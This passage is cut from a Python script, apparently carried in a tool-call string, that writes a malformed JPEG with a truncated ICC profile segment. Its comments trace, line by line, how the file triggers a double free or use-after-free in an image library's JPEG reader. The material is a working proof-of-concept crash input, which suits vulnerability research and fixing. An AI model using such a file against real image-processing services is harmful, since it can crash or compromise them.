re 200 bytes\n    segment_length = 2 + 12 + 2 + profile_data_size\n    f.write(struct.pack(">H", segment_length))\n    \n    # ICC_PROFILE identifier (12 bytes including null terminator)\n    f.write(b"ICC_PROFILE\\x00")\n    \n    # Sequence number and total markers (2 bytes)\n    f.write(b"\\x01")  # sequence number (1)\n    f.write(b"\\x01")  # total number of markers (1)\n    \n    # Write only a few bytes of profile data instead of 200\n    # This causes EOF in ReadICCProfile\'s read loop (line 557-566)\n    # triggering the "if (i != length)" condition at line 567\n    f.write(b"ABCDEFGHIJ")  # Only 10 bytes instead of 200\n    \n    # Add padding to reach at least 107 bytes total file size\n    # Current size: 2 (SOI) + 2+16 (APP0) + 2+2+12+2+10 (APP2 partial) = 48 bytes\n    # Need at least 107 bytes, so add 60+ more bytes\n    \n    # Add a comment marker (COM) with padding\n    f.write(b"\\xFF\\xFE")  # COM marker\n    com_length = 62  # 60 bytes of comment + 2 for length field\n    f.write(struct.pack(">H", com_length))\n    f.write(b"X" * 60)  # Padding comment data\n    \n    # File ends here (truncated) - no SOF, SOS, or EOI markers\n    # Total size: 48 + 2 + 62 = 112 bytes (> 107, passes initial check)\n    \n    # Expected behavior:\n    # 1. File passes 107-byte size check at line 1178\n    # 2. setjmp is set up at line 1193\n    # 3. jpeg_read_header() processes markers, calls ReadICCProfile\n    # 4. ReadICCProfile allocates StringInfo for 200 bytes, stores in error_manager->profile\n    # 5. Read loop hits EOF after only 10 bytes (i=10, length=200)\n    # 6. Line 567: i != length is true\n    # 7. Line 569: profile=DestroyStringInfo(profile) frees it\n    # 8. Line 573: return(FALSE) - but error_manager->profile is NOT nullified!\n    # 9. libjpeg error handling triggers longjmp back to line 1193\n    # 10. Line 1196-1197: tries to free error_manager->profile again -> UAF\n\nprint(f"Generated malformed JPEG with truncated ICC profile at: {output_path}")\nprint(f"File size: {f.tell()} bytes (>= 107 to pass initial check)")\nprint(f"Expected behavior: heap-use-after-free in DestroyStringInfo()")\n'}
